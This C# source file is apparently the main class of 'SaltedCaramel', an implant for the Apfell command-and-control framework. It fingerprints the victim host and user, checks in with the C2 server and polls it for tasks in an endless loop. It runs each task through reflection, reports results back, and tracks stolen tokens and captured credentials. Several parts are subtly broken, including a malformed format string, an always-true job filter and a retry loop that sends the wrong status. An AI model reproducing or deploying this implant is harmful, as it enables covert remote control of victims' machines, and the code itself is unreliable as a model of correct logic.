using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using Apfell.Structs;
using Apfell.C2Profiles;
using SaltedCaramel.Tasks;
using SaltedCaramel.Jobs;

namespace SaltedCaramel
{

    /// <summary>
    /// This class contains all methods used by the CaramelImplant
    /// </summary>
    public class SCImplant
    {
        private const int MAX_RETRIES = 20;
        public string action = "checkin";
        
        internal List<Job> JobList;
        public string host;
        public string ip;
        public int pid;
        internal int SleepInterval;
        public string user;
        public string uuid = "c1aa85e3-a62b-439e-912a-00560a4a1e21";
        public string domain;
        public string os;
        public string architecture;

        public C2Profile Profile;


        // serverEndpoint really should be a C2Profile class instance.
        public SCImplant(C2Profile profileInstance, int sleepTime=5000)
        {
            Profile = profileInstance;
            ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            host = Dns.GetHostName();
            domain = Environment.UserDomainName;
            pid = Process.GetCurrentProcess().Id;
            os = Environment.OSVersion.VersionString;
            if (IntPtr.Size == 8)
                architecture = "x64";
            else
                architecture = "x86";
            SleepInterval = sleepTime;
            user = Environment.UserName;
            //Endpoint = serverEndpoint;
            JobList = new List<Job>();
        }


        /// <summary>
        /// Send initial implant callback, different from normal task response
        /// because we need to get the implant ID from Apfell server
        /// </summary>
        public bool InitializeImplant()
        {
            int retryCount = 0;
            // If we didn't get success, retry and increment counter
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    string newUUID = Profile.RegisterAgent(this);
                    uuid = newUUID;
                    retryCount = 0;
                    return true;
                } catch (Exception ex)
                {
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return false;
        }

        public void Start()
        {
            if (InitializeImplant())
            {
                while (true)
                {
                    SCTask task = CheckTasking();
                    if (task.command != "none" && SCTask.TaskMap.ContainsKey(task.command))
                    {
                        Job j = new Job(task, this);
                        j.Start();

                        if (task.command != "jobs" || task.command != "jobkill") // We don't want to add our job tracking jobs.
                        {
                            JobList.Add(j);
                        }
                    }
                    Thread.Sleep(SleepInterval);
                }
            }
        }

        public void DispatchJob(Job job)
        {
            // using System.Reflection;
            // Type thisType = this.GetType();
            // MethodInfo theMethod = thisType.GetMethod(TheCommandString);
            // theMethod.Invoke(this, userParameters);
            string cmd;
            if (SCTask.TaskMap.TryGetValue(job.Task.command, out cmd))
            {
                object[] args = { job, this };
                var type = Type.GetType(String.Format("SaltedCaramel.Tasks.{}", cmd));
                type.GetMethod("Execute").Invoke(this, args);
            }

            SendResult(job);
        }

        public bool TryPostResponse(Job job)
        {
            int retryCount = 0;
            string result;
            result = Profile.PostResponse(new SCTaskResp(job.Task.id, job.Task.message));
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.PostResponse(new SCTaskResp(job.Task.id, job.Task.message));
                retryCount++;
            }
            return result.Contains("success");
        }

        public string TryGetPostResponse(SCTaskResp response)
        {
            int retryCount = 0;
            string result = "";
            result = Profile.PostResponse(response);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.PostResponse(response);
                retryCount++;
            }
            return result;
        }

        public bool TryPostResponse(SCTaskResp response)
        {
            int retryCount = 0;
            string result;
            result = Profile.PostResponse(response);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.PostResponse(response);
                retryCount++;
            }
            return result.Contains("success");
        }

        public bool TrySendComplete(Job job)
        {
            int retryCount = 0;
            string result = Profile.SendComplete(job.Task.id);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.SendComplete(job.Task.id);
                retryCount++;
            }
            return result.Contains("success");
        }

        public bool TrySendComplete(string taskID)
        {
            int retryCount = 0;
            string result = Profile.SendComplete(taskID);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.SendComplete(taskID);
                retryCount++;
            }
            return result.Contains("success");
        }

        public bool TrySendError(Job job)
        {
            int retryCount = 0;
            string result;
            result = Profile.SendError(job.Task.id, job.Task.message);
            while (!result.Contains("success") && retryCount < MAX_RETRIES)
            {
                result = Profile.SendComplete(job.Task.id);
                retryCount++;
            }
            return result.Contains("success");
        }
        

        public void SendResult(Job job)
        {
            int retryCount = 0;
            string result;
            if (job.Task.status == "complete" &&
                job.Task.command != "download" &&
                job.Task.command != "screencapture")
            {
                if (TryPostResponse(job))
                {
                    TrySendComplete(job);
                }
            }
            else if (job.Task.status == "error")
            {
                if (TrySendError(job))
                {
                    TrySendComplete(job);
                }
            }

            try
            {
                for (int i = 0; i < JobList.Count; ++i)
                {
                    if (JobList[i].JobID == job.JobID)
                    {
                        JobList.RemoveAt(i);
                    }
                }

            }
            catch (Exception e)
            {
                // This should only happen when testing.
                Debug.WriteLine($"[!] Caught exception: {e.Message}");
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        public SCTask CheckTasking()
        {
            int retryCount = 0;
            SCTask task = null;
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    task = Profile.CheckTasking(this);
                    break;

                } catch (Exception ex)
                {
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return task;
        }

        /// <summary>
        /// Check if the implant has an alternate token
        /// </summary>
        /// <returns>True if the implant has an alternate token, false if not</returns>
        public bool HasAlternateToken()
        {
            if (Tasks.Token.stolenHandle != IntPtr.Zero)
                return true;
            else return false;
        }

        public bool HasCredentials()
        {
            if (Tasks.Token.Cred.User != null)
                return true;
            else return false;
        }
    }
}
